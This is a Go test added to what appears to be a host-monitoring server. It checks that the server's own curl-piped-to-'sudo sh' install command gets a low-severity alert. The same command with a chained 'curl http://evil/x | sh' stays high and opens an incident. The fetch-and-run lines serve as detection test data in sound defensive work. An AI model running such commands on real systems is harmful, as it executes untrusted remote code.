@@ -252,3 +252,39 @@ func TestWindowsEventAlerts(t *testing.T) {
 		t.Errorf("incidents: %+v", incidents)
 	}
 }
+
+// 执行本管理中心的一键安装命令（ssh / Ansible 下发）命中"下载并执行"：降为低级、不开事件；拼接了其他命令的照常高危。
+func TestInstallCommandAlertDowngraded(t *testing.T) {
+	ts, adminToken, st := newTestServerWithStore(t)
+	st.SetInstallPin(testPin)
+	tok := strings.Repeat("a", 32) + "." + strings.Repeat("b", 64)
+	install := "sh -c curl -fsSLk --pinnedpubkey '" + testPin + "' 'https://10.0.0.5:8443/i/" + tok + "?id=office' | sudo sh"
+	ev := func(cmd string) model.HostEvent {
+		return model.HostEvent{Type: model.EventSuspiciousCommand, Time: time.Now(), User: "root", Severity: "high",
+			Detail: "[下载并执行] 命令匹配特征；命令：" + cmd + "；父进程：sshd"}
+	}
+	rep := model.AgentReport{Agent: model.AgentInfo{ID: "ops01", Hostname: "ops01", IPs: []string{"10.0.0.31"},
+		Capabilities: []string{"exec_monitor"}}, Events: []model.HostEvent{ev(install), ev(install + "; curl http://evil/x | sh")}}
+	if code := call(t, ts, agentToken, "POST", "/api/v1/agent/report", rep, nil); code != http.StatusOK {
+		t.Fatalf("report: %d", code)
+	}
+	var alerts []model.Alert
+	call(t, ts, adminToken, "GET", "/api/v1/alerts", nil, &alerts)
+	sev := map[model.Severity]int{}
+	for _, a := range alerts {
+		if a.Type == model.AlertSuspiciousCommand {
+			sev[a.Severity]++
+			if a.Severity == model.SeverityLow && !strings.Contains(a.Message, "一键安装命令") {
+				t.Errorf("low alert without note: %s", a.Message)
+			}
+		}
+	}
+	if sev[model.SeverityLow] != 1 || sev[model.SeverityHigh] != 1 {
+		t.Errorf("severities: %v", sev)
+	}
+	var incidents []model.Incident
+	call(t, ts, adminToken, "GET", "/api/v1/incidents", nil, &incidents)
+	if len(incidents) != 1 || incidents[0].AlertCount != 1 {
+		t.Errorf("only the high alert should open an incident: %+v", incidents)
+	}
+}
